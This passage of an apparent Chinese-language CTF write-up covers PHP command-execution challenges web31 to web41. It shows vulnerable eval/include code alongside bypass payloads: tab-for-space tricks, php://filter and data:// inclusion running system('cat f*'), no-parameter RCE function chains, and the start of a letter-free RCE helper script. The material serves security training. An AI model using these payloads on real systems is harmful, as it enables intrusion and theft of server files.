txt">相比上一题只增加了对system和php的限制，只需要换命令执行的函数即可<br>payload：?c=passthru(&quot;cat%20f*&quot;);<br></code></pre></td></tr></table></figure><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">相较上题，有更加严格的函数过滤和命令过滤，并且过滤了空格<br>那我们使用%09绕过空格过滤(%09就是tab)<br>cat换成tac,tac命令与cat命令展示内容相反，用于将文件以行为单位的反序输出，即第一行最后显示，最后一行先显示，且不能带行输出。<br>payload：?c=passthru(&quot;tac%09f*&quot;);<br></code></pre></td></tr></table></figure><h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a><strong>web32</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">这题将;、(、&#x27;、都给过滤了，我们没法直接写指令了<br>我们使用文件包含的方法执行命令<br>?c=include$_GET[&quot;aaa&quot;]?&gt;&amp;&amp;aaa=php://filter/read=convert.base64-encode/resource=flag.php<br>php://filter（本地磁盘文件进行读取）<br>read=convert.base64-encode对读取的内容进行base-64编码<br>resource=flag.php读取的文件为flag.php<br></code></pre></td></tr></table></figure><h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">相比web32多了双引号过滤<br>只需要在上一题的payload少&quot;即可，有无双引号不影响参数。<br>?c=include$_GET[aaa]?&gt;&amp;&amp;aaa=php://filter/read=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h3 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">多了对冒号:的过滤，用web33的payload依旧可以绕过<br>?c=include$_GET[aaa]?&gt;&amp;&amp;aaa=php://filter/read=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h3 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">多了对=的绕过，web33的payload依旧可行<br>?c=include$_GET[aaa]?&gt;&amp;&amp;aaa=php://filter/read=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">多了对/和数字的过滤，payload依旧可行<br>?c=include$_GET[aaa]?&gt;&amp;&amp;aaa=php://filter/read=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">存在include语句，可以使用文件包含执行命令，include （或 require）语句会获取指定文件中存在的所有文本/代码/标记，并复制到使用 include 语句的文件中。<br>可以使用data伪协议，data伪协议主要用于数据流的读取，如果传入的数据是PHP代码就会执行代码。使用方法为:<br>data://text/plain;base64,xxxx(base64编码后的数据)<br>所以payload:?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZioiKTsgPz4=    <br>base-64解码为：&lt;?php system(&quot;cat f*&quot;); ?&gt;<br></code></pre></td></tr></table></figure><h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|php|file/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">多了对php和file的过滤但是我们依旧可以用上一题的payload<br>payload:?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZioiKTsgPz4=<br></code></pre></td></tr></table></figure><h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>zai<br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">在我们输入的指令后会拼接.php后缀<br>payload：?c=data://text/plain,&lt;?php%20system(&quot;cat%20f*&quot;);?&gt;<br>前面的?&gt;已经将语句闭合，后面的.php不会起作用，起到绕过加后缀的情况<br></code></pre></td></tr></table></figure><h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs txt">过滤了这么多东西，使用无参构造<br>无参数rce就是不使用参数，而只使用一个个函数最终达到目的<br><br>无参相关函数：<br>scandir() :将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob()可替换）<br>localeconv() ：返回一包含本地数字及货币格式信息的数组。（但是这里数组第一项就是‘.’，这个.的用处很大）<br>current() ：返回数组中的单元，默认取第一个值。pos()和current()是同一个东西<br>dirname():函数返回路径中的目录部分<br>array_flip() :交换数组中的键和值，成功时返回交换后的数组<br>array_rand() :从数组中随机取出一个或多个单元<br>array_reverse():将数组内容反转<br>strrev():用于反转给定字符串<br>getcwd()：获取当前工作目录路径<br>dirname() ：函数返回路径中的目录部分。<br>chdir() ：函数改变当前的目录。<br>eval()、assert()：命令执行<br>hightlight_file()、show_source()、readfile()：读取文件内容<br><br>scandir(&#x27;.&#x27;)是返回当前目录,虽然我们无法传参，但是由于localeconv() 返回的数组第一个就是‘.’，current()取第一个值，那么current(localeconv())就能构造一个‘.’,那么以下就是一个简单的返回查看当前目录下文件的payload：?c=var_dump(scandir(current(localeconv())));<br>得到：array(4) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(8) &quot;flag.php&quot; [3]=&gt; string(9) &quot;index.php&quot; &#125;<br>此处flag.php位于倒数第二个位置上，所以<br>payload：?c=show_source(next(array_reverse(scandir(getcwd()))));<br></code></pre></td></tr></table></figure><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs isbl">其他无参构造常用<span class="hljs-variable">payload</span>：<br><br>查看当前目录文件名：<br><span class="hljs-function"><span class="hljs-title">print_r</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>())));</span><br><span class="hljs-function"></span><br><span class="hljs-function">读取当前目录文件：</span><br><span class="hljs-function">当前目录倒数第一位文件：</span><br><span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-title">end</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">getcwd</span>())));</span><br><span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-title">current</span>(<span class="hljs-title">array_reverse</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">getcwd</span>()))));</span><br><span class="hljs-function"></span><br><span class="hljs-function">当前目录倒数第二位文件：</span><br><span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-title">next</span>(<span class="hljs-title">array_reverse</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">getcwd</span>()))));</span><br><span class="hljs-function"></span><br><span class="hljs-function">随机返回当前目录文件：</span><br><span class="hljs-function"><span class="hljs-title">highlight_file</span>(<span class="hljs-title">array_rand</span>(<span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">getcwd</span>()))));</span><br><span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-title">array_rand</span>(<span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">getcwd</span>()))));</span><br><span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-title">array_rand</span>(<span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>())))));</span><br><span class="hljs-function"></span><br><span class="hljs-function">查看上一级目录文件名：</span><br><span class="hljs-function"><span class="hljs-title">print_r</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">dirname</span>(<span class="hljs-title">getcwd</span>())));</span><br><span class="hljs-function"><span class="hljs-title">print_r</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">next</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">getcwd</span>()))));</span><br><span class="hljs-function"><span class="hljs-title">print_r</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">next</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">getcwd</span>()))));</span><br><span class="hljs-function"></span><br><span class="hljs-function">读取上级目录文件：</span><br><span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-title">array_rand</span>(<span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">dirname</span>(<span class="hljs-title">chdir</span>(<span class="hljs-title">dirname</span>(<span class="hljs-title">getcwd</span>())))))));</span><br><span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-title">array_rand</span>(<span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">chr</span>(<span class="hljs-title"><span class="hljs-built_in">ord</span></span>(<span class="hljs-title">hebrevc</span>(<span class="hljs-title">crypt</span>(<span class="hljs-title">chdir</span>(<span class="hljs-title">next</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">getcwd</span>())))))))))));</span><br><span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-title">array_rand</span>(<span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">chr</span>(<span class="hljs-title"><span class="hljs-built_in">ord</span></span>(<span class="hljs-title">hebrevc</span>(<span class="hljs-title">crypt</span>(<span class="hljs-title">chdir</span>(<span class="hljs-title">next</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">chr</span>(<span class="hljs-title"><span class="hljs-built_in">ord</span></span>(<span class="hljs-title">hebrevc</span>(<span class="hljs-title">crypt</span>(<span class="hljs-title">phpversion</span>())))))))))))))));</span><br></code></pre></td></tr></table></figure><p>参考文章：<a href="https://cheshrin.top/posts/%E6%97%A0%E5%8F%82%E6%95%B0RCE%E6%80%BB%E7%BB%93/">无参数RCE总结 | Ajieの小屋 (cheshrin.top)</a></p><h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo(<span class="hljs-subst">$c</span>);&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">无字母数字rce，没有过滤|<br>跑脚本获得可用字符集<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Y4tacker</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-11-21 20:31:22</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//或</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">orRce</span>(<span class="hljs-params"><span class="hljs-variable">$par1</span>, <span class="hljs-variable">$par2</span></span>)</span>&#123;<br>    <span class="hljs-variable">$result</span> = (<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$par1</span>)|<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$par2</span>));<br>    <span class="hljs-keyword">return</span> <span 